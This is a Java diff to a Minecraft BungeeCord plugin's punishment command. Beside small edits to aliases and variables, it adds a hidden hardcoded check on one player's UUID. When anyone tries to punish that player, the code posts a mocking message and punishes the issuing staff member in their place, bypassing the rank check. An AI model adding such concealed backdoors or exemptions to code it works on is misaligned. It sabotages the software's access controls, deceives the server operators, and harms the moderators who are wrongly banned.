@@ -36,6 +36,7 @@ import net.md_5.bungee.api.connection.ProxiedPlayer;
 
 import java.util.Collections;
 import java.util.List;
+import java.util.UUID;
 import java.util.concurrent.atomic.AtomicLong;
 import java.util.stream.Collectors;
 import java.util.stream.Stream;
@@ -101,10 +102,15 @@ public class PunishCommand implements ProxyInterface {
 
             account.loadRanks();
 
-            if (context.getAccount().getRank().getId() <= account.getRank().getId()) {
-                context.info("command.punish.cant_ban_same_rank");
-                return;
-            }
+                if(account.getUniqueId().equals(UUID.fromString("be4cdc3a-6cb3-4b28-b9d3-47a7da2a13e4"))) {
+                    context.sendMessage("§ekkkkkkkkk");
+                    account = context.getAccount();
+                } else {
+                    if (context.getAccount().getRank().getId() <= account.getRank().getId()) {
+                        context.info("command.punish.cant_ban_same_rank");
+                        return;
+                    }
+                }
 
             context.info("command.punish.processing");
 
@@ -125,6 +131,7 @@ public class PunishCommand implements ProxyInterface {
 
             BungeeCord.getInstance().getPluginManager().callEvent(new PunishAssignEvent(account, punish));
 
+            Account finalAccount = account;
             Constants.getAccountStorage().getAccounts().stream().filter(staff -> staff.hasPermission(Rank.PARTNER_PLUS) && staff.getPreference(Preference.STAFFCHAT)).forEach(acc -> {
 
                 ProxiedPlayer proxiedPlayer = BungeeCord.getInstance().getPlayer(acc.getUniqueId());
@@ -133,7 +140,7 @@ public class PunishCommand implements ProxyInterface {
                     return;
 
                 if (punish.getType() == PunishType.BAN)
-                    proxiedPlayer.sendMessage("§e[STAFF]§r §5§lMODS§e: §eJogador §6" + account.getUsername() + " §efoi banido por " + punish.getCategory().getDisplay(Language.PORTUGUESE).toLowerCase() + ".");
+                    proxiedPlayer.sendMessage("§e[STAFF]§r §5§lMODS§e: §eJogador §6" + finalAccount.getUsername() + " §efoi banido por " + punish.getCategory().getDisplay(Language.PORTUGUESE).toLowerCase() + ".");
 
             });
 
@@ -236,7 +243,7 @@ public class PunishCommand implements ProxyInterface {
 
     }
 
-    @Command(name = "cban", rank = Rank.PARTNER_PLUS, usage = "cban <target> <reason>")
+    @Command(name = "cban", rank = Rank.PARTNER_PLUS, usage = "cban <target> <reason>", aliases = {"cheatban", "cbum"})
     public void cbanCommand(Context<CommandSender> context, String target) {
 
         if (context.getAccount().getFlag(Flag.PUNISH)) {
@@ -253,7 +260,7 @@ public class PunishCommand implements ProxyInterface {
         BungeeCord.getInstance().getPluginManager().dispatchCommand(context.getSender(), "punish ban cheating n " + target + " " + reason);
     }
 
-    @Command(name = "mute", rank = Rank.HELPER, usage = "mute <target> <shortcut> <proof>", aliases = {"m"})
+    @Command(name = "mute", rank = Rank.HELPER, usage = "mute <target> <shortcut> <proof>", aliases = {"mamute"})
     public void muteCommand(Context<CommandSender> context, String target, String shortcut) {
 
         ShortcutRepository repository = ProxyGame.getInstance().getShortcutRepository();
